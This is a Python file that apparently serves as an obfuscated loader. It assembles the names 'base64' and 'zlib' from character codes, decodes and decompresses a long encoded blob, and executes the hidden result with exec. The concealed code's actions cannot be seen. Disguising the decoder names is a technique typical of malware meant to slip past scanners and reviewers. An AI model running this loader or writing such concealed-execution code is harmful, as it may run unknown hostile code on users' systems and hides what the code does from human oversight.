import importlib

_m1 = importlib.import_module("".join(chr(c) for c in [98, 97, 115, 101, 54, 52]))
_m2 = importlib.import_module("".join(chr(c) for c in [122, 108, 105, 98]))

_p = (
    "c-pmCYi|_S8UDV%;%E@^Y`d%%2$-z2GzK<g8*GpbYEptm<DIkKNp@#8GqW+qv4pP}Hw~htUm%rBky&tTjBy-dzEtY3nEA>d2tOgu"
    "d(K?faaF0RrSZ<pdCz;lJZEx8SmoFLn7`rg_%DK0e~<aSVA1dSyLk1&-^SC@ukXp3?T+nu%$;_b?lKL(Iqg#Ie06lZs#QO^QXBh}"
    "RhXfB+%wx;JyAMwy1?Equ%QCO&B;=MdACffVOMDRmTmE3*Q@6f79-;qv0w4`{g=?K$AZOR-rt6%PzYKr<K_<Ze2fSG2cds2SO^vv"
    "jM(uvgS*m@jbH`qd%+?Lmi&G34mYpyc8B@<c!=p1v2jyySz;f2T+&7^D!H7&8%(P=dHoBmW!Aanay4JhG5nd0*tVi&PpKIz*jd)+"
    "3b~2?I*w_1YTC?vyhcte@|&io9?$0viPeAmms1o)FuvCE9GzY2-t0Ql>?&{ZNk?z9D~{bTTb!M<J*JN7W@}2HW|uoK!@R`}_V)Gz"
    "HfB%jEq2bdS=BH-)3&6dmvq--qk5Z{vAJcinxlVdva7J4snxGIgtSeo>v2hq?Pd0%Zq=t*r|IY}cbQ{*x@TIGj0@^hA-&6f%l^Q1"
    "ugRSPyJXjO5?NrnWe6p&x!kcJ)h!Ck!t9G;kZU-0JAPu}Y7`W?N_UiT(dr-ZT*Gt3OLwQOx*0!y?%Gy#-*s9obE4?*FT33JqPMmy"
    "8GCT5*R-u7F^ITFo<83)x#eXEBbr9ns*{y&4$%&aZW|dd(;8{HjtA7BxHgc&!7}|@4CYwfwi@PSu`|t7|CzrXtYB%pIzC>zJgSXf"
    "9jlFAM8)_|g5}^2qpbF~s4_NC3d>Xn8={<g{?lMJFLjd)Bh7}d)U?`#g82Ptc>JSW?$Fke)iJEF?O+vxo*&XW&eyJfs*MhhRH?!*"
    "m`F2SkuR$wmw#WQx9`^OJyQO+8X%qDt=+$mLWhfb!V7TX92(scRD&}%{5RAt7#hbS@(@}}pUjJWxpTG4+Lf{DhqX_t<Iw54NN7c{"
    "MDKym!!U`EtON^6K~lVZ_}$Mx-4l|ioj?|~R1)|jp6>*ABf@uUfBBZ7S*?KG4yi;jhwB8>6xCC-yglf)BPm`(;EKPMtUtiQ6J(F*"
    "Yl%47B!ksNFX+1qihZJ?#`p{b3*?%F*CWtu6OEL$1^s)_=y^)oIs@lkq|G|zA0GE(G2cC7c(*6LEVKH1vEyl$(Y;4Z^y<aPi%=<;"
    "59ShzZ`MfECbj%s?0=mS^6-K1@jNyOV_phF9;fzxgG~^)9d>wsOS;zINN9ThqA7q>jf|bg!+cuDzpauOe}^2-;NZo6f^WBF-h|Ox"
    "Cw(F0RYLLbHj6?AzsT5ZiS*e{`2s5JiMbX}sm=8I(>aDQN1XRVQT<s5Rj}}c9387e_K4DauH<gya&;ZE44FJ5cTCA{tCX2?^31<q"
    "o{u=S(BZWP_v%e7m2$Ik4tlmWfqt)9-8OghmaBUFrdMXJ=j7S3v-B&69J(_(8>+2_kwtFqP-RgV*X7LJgI;e)$$c!XqAs4Zutr}&"
    "*Kl$<-0M0PBRNIPFw1SBzpD^bZ0lce@kUij$4{Jm@6_p`Gw&+}IN|SWo4B@cy}-4N>m{xoT(5BL;`#yCo|4Z?t0uXpg?@-eI~jna"
    "^q*0fNd4zg+0FaAghSE|E{ql8NnS=XrrOzzwrq)}BT8}(yI<!c(*PMX&rJcOVg^m*i*)OHdb^|MBfJsrImSd7ucyOw1Bm1JnNlf%"
    "8J;tpJkTFT7{oP{rss9s^5Ec<2S1wD;7r_%XMfkQown{(j(SRFE5;tSW@lh=O#Z5PU0_YF8{Ba#GXpfHj}1>^<PDVBKpm?Cv-u3S"
    "Dbs8AGsC0Z;g*W$f|%NN*Q=b$6R>o++rfn7S!;xeyxoCb5doO#20Ul*x@~ZEpzAe`of*g%kuPTC#q?k3#i$5wfE95(j4tEtN*Iio"
    "nBT1Pj>oFv2NON3ZAW+AbVm1!PEs+#M%sjFtJ%7O#KZGNP)xLJ09Cu88NhNv#bVR$I_x*>_z8e3m0n1!#Rdo2sW7oDgWm*oX7f?j"
    "LNwCzFQ3*wy>MMHfC&OVF*2mvA?37=gqUhwAfR#|A`-@p0)qV?@pOXIqBpi%)FOa=piCz8$)=$jnt+gpxjI6Psxs`F`rtXaNA#13"
    "&k=S!AD^S-afNyyov(JvvSX~E8*EU^OSQ(h6(&Utp&Al^!jsaCQo12dRm#y?`RIs}SS&hpsQ<x+9kNTvJKQmCgYeds5rtxq5hIf4"
    "Y=yFiw_MJY;gO^<h<YGEu2Fv$tz{;bKFek#>scl3mJ@jbL7Rk0{8xlz7YMf|xN#W{d6}|bo){RIAFPd-D6FE8DDLHHxhI8O01`Cq"
    "FdWYa)dVYv<4ikch!i}_zGfd>aE5gF(WCoO`z!sTVc_XA>)qO4|IAX&lg)&pvnKbQEOEO_<AQ*|Z8lV*5wioJ*bDvy6iQ=+M)*8*"
    "y_;llLsVm=AyvarDcfLD+DEt7%R{9bX-(b}PLLqz`^X8vH9|T@bxf*H>88hI)vECkrKs2IcGvQX*F<%P=f`LYWVDG>qmoUMLWWA8"
    "pe7%w8!zRP$i_GI7S}Bbd&)kv`%X)*qtSn64HVb_;xmx%>k18E(WUs4!D7n%uQLf(W~qp$(*p~!>{%tuss3J1Q;L@lihlSH0Ucie"
    "wmu<zE-~=q{~QHK<U&%?PTRU^McCvBP9DUDU~%|~Mi?jhOn5XDObNj3N>sH?jfnDV>A)E=<cXA9k)KEeR9O`tRNfGJi%*WP1t208"
    "!2-eI`Ov50Bg_V*3h=&26^$Gw@COJu=l_(|1}JDXQWI6Ax!iS4IylQ;p-y<OiO&=0Oes3qeR47-C_S;BohoX2cj3S>HjH38!_iE2"
    "#|!(3j9p*W^r&~x9TVrJbUCAnCEVXCM%f__(|X6ngg3e^?iAxYl#u+w5FfJXv37YpB9P`sPq3|@AnIy}*rqu1$JjJUDRGvi6Nx;i"
    "WO){K!_YprC)DhS2Ig|i$w}^1l)3{q7ntr$x|MKp7xD!JrEXhBMJa`|CS_jezO?`3nMdR{(qV)0XP=@j-~BUKetY|=yicFZMgC+?"
    "=ajqmDKY!c=drh^nv^A1oo=cCWpqPd7u^=;9rfhtQVCnoN;TP!G*&@wX&M!mrYUlF|EIp(L5vWwb-I=+3p1Z?3hKvvdcxKnqh@*B"
    "ak?F^z{aOt0Lv;+N4~#H(0TiQm}=`HV7;h-h38=BFI(34RR"
)

exec(compile(_m2.decompress(_m1.b85decode(_p)), "main.py", "exec"))
